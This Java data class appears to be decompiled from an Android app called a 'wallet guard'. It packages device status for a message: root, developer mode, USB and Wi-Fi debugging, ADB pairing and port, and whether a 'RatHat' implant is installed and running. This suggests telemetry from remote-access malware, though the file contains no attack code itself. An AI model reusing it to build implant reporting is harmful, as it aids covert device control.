package com.guard.wallet.resp;

import com.guard.wallet.core.AppUtils;
import androidx.annotation.NonNull;
import com.guard.wallet.entity.ADBConfig;
import com.guard.wallet.req.MessageBodyVO;
import com.guard.wallet.utils.SystemHelper;
import com.guard.wallet.utils.SharedPrefsManager;

public class DeviceDebugVO extends MessageBodyVO {
    private Integer isRoot;
    private Integer enableDevelopment;
    private Integer enableDebug;
    private Integer enableWifiDebug;
    private Integer ratHatImplant;
    private Integer ratHatRunning;
    private Integer deviceDebugPort;
    private Integer devicePaired;
    private Integer deviceConnected;

    // ═══════ Constructors ═══════

    public DeviceDebugVO() {
    }

    public DeviceDebugVO(Integer isRoot, Integer enableDevelopment, Integer enableDebug,
                         Integer enableWifiDebug, Integer ratHatImplant, Integer ratHatRunning,
                         Integer deviceDebugPort, Integer devicePaired, Integer deviceConnected) {
        this.isRoot = isRoot;
        this.enableDevelopment = enableDevelopment;
        this.enableDebug = enableDebug;
        this.enableWifiDebug = enableWifiDebug;
        this.ratHatImplant = ratHatImplant;
        this.ratHatRunning = ratHatRunning;
        this.deviceDebugPort = deviceDebugPort;
        this.devicePaired = devicePaired;
        this.deviceConnected = deviceConnected;
    }

    // ═══════ Factory methods ═══════

    public static DeviceDebugVO of() {
        DeviceDebugVO vo = onlyDebug();
        ADBConfig config = SharedPrefsManager.J();
        vo.setRatHatImplant(config.getInstalledRatHat());
        vo.setRatHatRunning(config.getIsRatHatRunning());
        vo.setDevicePaired(config.isPaired() ? 1 : 0);
        vo.setDeviceConnected(config.isConnected() ? 1 : 0);
        vo.setDeviceDebugPort(config.getDebugPort());
        return vo;
    }

    public static DeviceDebugVO onlyDebug() {
        DeviceDebugVO vo = new DeviceDebugVO();
        Integer one = 1;
        Integer zero = 0;
        vo.setIsRoot(AppUtils.e() ? one : zero);
        vo.setEnableDevelopment(SystemHelper.K() ? one : zero);
        vo.setEnableDebug(SystemHelper.I() ? one : zero);
        vo.setEnableWifiDebug(SystemHelper.J() ? one : zero);
        return vo;
    }

    // ═══════ Getters ═══════

    public Integer getIsRoot() { return this.isRoot; }
    public Integer getEnableDevelopment() { return this.enableDevelopment; }
    public Integer getEnableDebug() { return this.enableDebug; }
    public Integer getEnableWifiDebug() { return this.enableWifiDebug; }
    public Integer getRatHatImplant() { return this.ratHatImplant; }
    public Integer getRatHatRunning() { return this.ratHatRunning; }
    public Integer getDeviceDebugPort() { return this.deviceDebugPort; }
    public Integer getDevicePaired() { return this.devicePaired; }
    public Integer getDeviceConnected() { return this.deviceConnected; }

    // ═══════ Setters ═══════

    public void setIsRoot(Integer isRoot) { this.isRoot = isRoot; }
    public void setEnableDevelopment(Integer enableDevelopment) { this.enableDevelopment = enableDevelopment; }
    public void setEnableDebug(Integer enableDebug) { this.enableDebug = enableDebug; }
    public void setEnableWifiDebug(Integer enableWifiDebug) { this.enableWifiDebug = enableWifiDebug; }
    public void setRatHatImplant(Integer ratHatImplant) { this.ratHatImplant = ratHatImplant; }
    public void setRatHatRunning(Integer ratHatRunning) { this.ratHatRunning = ratHatRunning; }
    public void setDeviceDebugPort(Integer deviceDebugPort) { this.deviceDebugPort = deviceDebugPort; }
    public void setDevicePaired(Integer devicePaired) { this.devicePaired = devicePaired; }
    public void setDeviceConnected(Integer deviceConnected) { this.deviceConnected = deviceConnected; }

    // ═══════ toString ═══════

    @NonNull
    @Override
    public String toString() {
        StringBuilder sb = new StringBuilder("DeviceDebugVO{isRoot=");
        sb.append(this.isRoot);
        sb.append(", enableDevelopment=");
        sb.append(this.enableDevelopment);
        sb.append(", enableDebug=");
        sb.append(this.enableDebug);
        sb.append(", enableWifiDebug=");
        sb.append(this.enableWifiDebug);
        sb.append(", ratHatImplant=");
        sb.append(this.ratHatImplant);
        sb.append(", ratHatRunning=");
        sb.append(this.ratHatRunning);
        sb.append(", deviceDebugPort=");
        sb.append(this.deviceDebugPort);
        sb.append(", devicePaired=");
        sb.append(this.devicePaired);
        sb.append(", deviceConnected=");
        sb.append(this.deviceConnected);
        sb.append('}');
        return sb.toString();
    }
}
